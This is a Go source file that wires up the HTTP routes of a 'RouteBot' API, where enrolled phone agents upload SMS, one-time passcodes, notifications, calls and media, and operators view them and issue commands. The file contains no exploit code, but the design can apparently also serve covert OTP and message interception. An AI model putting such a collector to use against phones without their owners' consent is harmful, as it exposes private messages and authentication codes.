package httpapi

import (
	"embed"

	"time"

	"github.com/gofiber/fiber/v3"
	"github.com/gofiber/fiber/v3/middleware/cors"
	"github.com/gofiber/fiber/v3/middleware/limiter"
	"github.com/gofiber/fiber/v3/middleware/recover"
	"github.com/routedns/routebot/backend/internal/adapters/http/handlers"
	"github.com/routedns/routebot/backend/internal/adapters/http/middleware"
	"github.com/routedns/routebot/backend/internal/config"
	"github.com/routedns/routebot/backend/internal/pkg/auth"
	"github.com/routedns/routebot/backend/internal/pkg/response"
	"github.com/routedns/routebot/backend/internal/service"
)

//go:embed static/*
var staticFS embed.FS

type Deps struct {
	Config     *config.Config
	Tokens     *auth.Manager
	Auth       *service.AuthService
	Devices    *service.DeviceService
	Events     *service.EventService
	Commands   *service.CommandService
	Media      *service.MediaService
	Webhooks   *service.WebhookService
	Enrollment *service.EnrollmentService
	WS         fiber.Handler
}

func NewRouter(d Deps) *fiber.App {
	app := fiber.New(fiber.Config{
		AppName:       "RouteBot API",
		BodyLimit:     64 * 1024 * 1024,
		CaseSensitive: true,
	})

	app.Use(recover.New())
	app.Use(middleware.RequestID())
	app.Use(cors.New(cors.Config{
		AllowOrigins: []string{d.Config.CORSOrigins},
		AllowHeaders: []string{"Origin", "Content-Type", "Accept", "Authorization", "X-Device-API-Key", "X-Request-ID"},
	}))

	app.Get("/healthz", func(c fiber.Ctx) error {
		return response.OK(c, fiber.Map{"status": "ok"})
	})

	app.Get("/", func(c fiber.Ctx) error {
		return c.Redirect().Status(fiber.StatusFound).To("/dashboard")
	})
	app.Get("/dashboard", func(c fiber.Ctx) error {
		b, err := staticFS.ReadFile("static/dashboard.html")
		if err != nil {
			return response.Fail(c, fiber.StatusInternalServerError, "internal_error", "dashboard missing")
		}
		c.Set("Content-Type", "text/html; charset=utf-8")
		return c.Send(b)
	})

	authH := handlers.NewAuthHandler(d.Auth)
	deviceH := handlers.NewDeviceHandler(d.Devices)
	eventH := handlers.NewEventHandler(d.Events)
	cmdH := handlers.NewCommandHandler(d.Commands)
	mediaH := handlers.NewMediaHandler(d.Media)
	hookH := handlers.NewWebhookHandler(d.Webhooks)
	enrollH := handlers.NewEnrollmentHandler(d.Enrollment)

	jwt := middleware.JWT(d.Tokens)
	deviceKey := middleware.DeviceAPIKey(d.Devices)

	// Defense in depth alongside nginx's rate limiting: throttle auth/enrollment
	// endpoints per client IP in case the app is ever reached directly.
	authLimiter := limiter.New(limiter.Config{
		Max:               10,
		Expiration:        1 * time.Minute,
		LimiterMiddleware: limiter.SlidingWindow{},
	})

	v1 := app.Group("/api/v1")

	v1.Post("/auth/register", authLimiter, authH.Register)
	v1.Post("/auth/login", authLimiter, authH.Login)
	v1.Post("/auth/refresh", authLimiter, authH.Refresh)

	v1.Post("/enrollment/claim", authLimiter, enrollH.Claim)
	v1.Post("/enrollment/tokens", jwt, enrollH.Create)

	agent := v1.Group("/agent")
	agent.Post("/heartbeat", deviceKey, deviceH.Heartbeat)
	agent.Post("/crash", deviceKey, deviceH.ReportCrash)
	agent.Post("/sms", deviceKey, eventH.IngestSMS)
	agent.Post("/sms/:id/status", deviceKey, eventH.UpdateSMSStatus)
	agent.Post("/otp", deviceKey, eventH.IngestOTP)
	agent.Post("/notifications", deviceKey, eventH.IngestNotification)
	agent.Post("/calls", deviceKey, eventH.IngestCall)
	agent.Post("/commands/:id/ack", deviceKey, cmdH.Ack)
	agent.Post("/media", deviceKey, mediaH.Upload)

	v1.Post("/devices", jwt, deviceH.Register)
	v1.Get("/devices", jwt, deviceH.List)
	v1.Get("/devices/:id", jwt, deviceH.Get)
	v1.Get("/devices/:id/health", jwt, deviceH.Health)
	v1.Get("/devices/:id/health/history", jwt, deviceH.HealthHistory)
	v1.Get("/devices/:id/live", jwt, deviceH.LiveStatus)
	v1.Get("/devices/:id/sms", jwt, eventH.ListSMS)
	v1.Get("/devices/:id/otp", jwt, eventH.ListOTP)
	v1.Get("/devices/:id/notifications", jwt, eventH.ListNotifications)
	v1.Get("/devices/:id/calls", jwt, eventH.ListCalls)
	v1.Post("/devices/:id/commands", jwt, cmdH.Create)
	v1.Get("/devices/:id/commands", jwt, cmdH.List)
	v1.Get("/devices/:id/media", jwt, mediaH.List)
	v1.Get("/media/:id", jwt, mediaH.Download)
	v1.Post("/webhooks", jwt, hookH.Create)
	v1.Get("/webhooks", jwt, hookH.List)

	if d.WS != nil {
		app.Get("/ws/agent", d.WS)
	}

	return app
}
